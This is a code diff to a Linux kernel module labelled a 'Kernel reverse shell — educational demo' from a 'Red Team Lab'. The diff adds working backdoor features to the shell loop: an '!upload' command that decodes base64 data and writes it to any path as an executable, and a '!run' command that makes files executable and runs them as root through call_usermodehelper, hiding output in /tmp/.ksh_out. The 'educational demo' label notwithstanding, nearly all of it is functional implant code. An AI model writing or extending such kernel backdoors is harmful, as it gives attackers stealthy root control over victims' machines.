@@ -39,6 +39,8 @@
 #include <linux/delay.h>
 #include <net/sock.h>
 
+#include "b64_kernel.h"
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Red Team Lab");
 MODULE_DESCRIPTION("Kernel reverse shell — educational demo");
@@ -94,6 +96,70 @@ static int krecv(struct socket *sock, void *buf, int len)
     struct msghdr msg = {};
     struct kvec iov = { .iov_base = buf, .iov_len = len };
     return kernel_recvmsg(sock, &msg, &iov, 1, len, 0);
+}
+
+/* --- !upload handler --- */
+static int cmd_upload_plain(const char *args, char *output, int output_len)
+{
+    const char *path_end;
+    char path[256];
+    const char *b64_data;
+    u8 *decoded;
+    int decoded_len, path_len;
+    struct file *f;
+    loff_t pos = 0;
+
+    path_end = strchr(args, ' ');
+    if (!path_end) {
+        snprintf(output, output_len, "usage: !upload <path> <base64>\n");
+        return -1;
+    }
+    path_len = path_end - args;
+    if (path_len >= (int)sizeof(path)) path_len = sizeof(path) - 1;
+    memcpy(path, args, path_len);
+    path[path_len] = '\0';
+    b64_data = path_end + 1;
+
+    decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
+    if (!decoded) return -ENOMEM;
+    decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
+    if (decoded_len < 0) { kfree(decoded); return -1; }
+
+    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    if (IS_ERR(f)) { kfree(decoded); return PTR_ERR(f); }
+    kernel_write(f, decoded, decoded_len, &pos);
+    filp_close(f, NULL);
+    kfree(decoded);
+
+    snprintf(output, output_len, "uploaded %d bytes → %s\n", decoded_len, path);
+    return 0;
+}
+
+/* --- !run handler --- */
+static int cmd_run_plain(const char *args, char *output, int output_len)
+{
+    char *full_cmd;
+    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
+    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    struct file *f;
+    loff_t pos = 0;
+    int ret;
+
+    full_cmd = kmalloc(strlen(args) + 128, GFP_KERNEL);
+    if (!full_cmd) return -ENOMEM;
+    snprintf(full_cmd, strlen(args) + 128,
+             "chmod +x %s 2>/dev/null; %s > /tmp/.ksh_out 2>&1", args, args);
+    argv[2] = full_cmd;
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    kfree(full_cmd);
+
+    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
+    if (IS_ERR(f)) { snprintf(output, output_len, "(no output)\n"); return 0; }
+    memset(output, 0, output_len);
+    ret = kernel_read(f, output, output_len - 1, &pos);
+    filp_close(f, NULL);
+    if (ret >= 0 && ret < output_len) output[ret] = '\0';
+    return ret;
 }
 
 /*
@@ -191,7 +257,7 @@ static int shell_loop(void *data)
                          "[kshell] type commands, output via call_usermodehelper\n"
                          "[kshell] type 'exit' to disconnect\n\n# ";
 
-    recv_buf = kmalloc(4096, GFP_KERNEL);
+    recv_buf = kmalloc(1024 * 1024, GFP_KERNEL); /* 1MB for file uploads */
     output_buf = kmalloc(65536, GFP_KERNEL);
     if (!recv_buf || !output_buf)
         goto out;
@@ -254,10 +320,16 @@ static int shell_loop(void *data)
             break;
         }
 
-        /* Execute command */
-        pr_debug("kshell: exec: %s\n", recv_buf);
+        /* Dispatch command */
+        pr_debug("kshell: cmd: %s\n", recv_buf);
         memset(output_buf, 0, 65536);
-        ret = run_cmd(recv_buf, output_buf, 65536);
+
+        if (strncmp(recv_buf, "!upload ", 8) == 0)
+            cmd_upload_plain(recv_buf + 8, output_buf, 65536);
+        else if (strncmp(recv_buf, "!run ", 5) == 0)
+            cmd_run_plain(recv_buf + 5, output_buf, 65536);
+        else
+            run_cmd(recv_buf, output_buf, 65536);
 
         /* Send output back */
         len = strlen(output_buf);
